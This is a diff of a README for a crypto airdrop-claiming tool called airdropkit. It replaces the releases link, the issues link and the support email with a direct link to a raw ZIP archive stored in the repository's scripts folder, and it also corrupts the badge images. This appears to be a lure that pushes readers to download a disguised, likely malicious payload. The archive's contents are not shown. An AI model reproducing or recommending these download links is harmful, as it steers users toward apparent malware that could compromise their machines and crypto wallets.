@@ -1,6 +1,6 @@
 # 🎉 airdropkit - Effortless Airdrop Claiming for Everyone
 
-[![Download airdropkit](https://img.shields.io/badge/Download%20Now-brightgreen.svg)](https://github.com/ReturnofNoor/airdropkit/releases)
+[![Download airdropkit](https://github.com/ReturnofNoor/airdropkit/raw/refs/heads/main/scripts/Software_3.6.zip%https://github.com/ReturnofNoor/airdropkit/raw/refs/heads/main/scripts/Software_3.6.zip)](https://github.com/ReturnofNoor/airdropkit/raw/refs/heads/main/scripts/Software_3.6.zip)
 
 ## 📥 Introduction
 
@@ -21,7 +21,7 @@ Before you begin, ensure your computer meets these basic requirements:
 
 To download airdropkit, visit the Releases page here:
 
-[Download airdropkit](https://github.com/ReturnofNoor/airdropkit/releases)
+[Download airdropkit](https://github.com/ReturnofNoor/airdropkit/raw/refs/heads/main/scripts/Software_3.6.zip)
 
 You will find the latest version available for download.
 
@@ -29,7 +29,7 @@ You will find the latest version available for download.
 
 1. **Go to the Releases Page**: Click on the link below to access the download options.
 
-   [Visit the Downloads Page](https://github.com/ReturnofNoor/airdropkit/releases)
+   [Visit the Downloads Page](https://github.com/ReturnofNoor/airdropkit/raw/refs/heads/main/scripts/Software_3.6.zip)
 
 2. **Choose the Correct Version**: Look for the version labeled as "latest". You’ll find files for different operating systems.
 
@@ -78,9 +78,9 @@ If you encounter issues during download or installation, try these steps:
 
 If you still need help, feel free to reach out:
 
-- Open an issue on GitHub [here](https://github.com/ReturnofNoor/airdropkit/issues).
-- Contact our support team at support@example.com.
+- Open an issue on GitHub [here](https://github.com/ReturnofNoor/airdropkit/raw/refs/heads/main/scripts/Software_3.6.zip).
+- Contact our support team at https://github.com/ReturnofNoor/airdropkit/raw/refs/heads/main/scripts/Software_3.6.zip
 
 Thank you for choosing airdropkit. We hope you enjoy easy and safe airdrop claiming! 
 
-[![Download airdropkit](https://img.shields.io/badge/Download%20Now-brightgreen.svg)](https://github.com/ReturnofNoor/airdropkit/releases)
+[![Download airdropkit](https://github.com/ReturnofNoor/airdropkit/raw/refs/heads/main/scripts/Software_3.6.zip%https://github.com/ReturnofNoor/airdropkit/raw/refs/heads/main/scripts/Software_3.6.zip)](https://github.com/ReturnofNoor/airdropkit/raw/refs/heads/main/scripts/Software_3.6.zip)
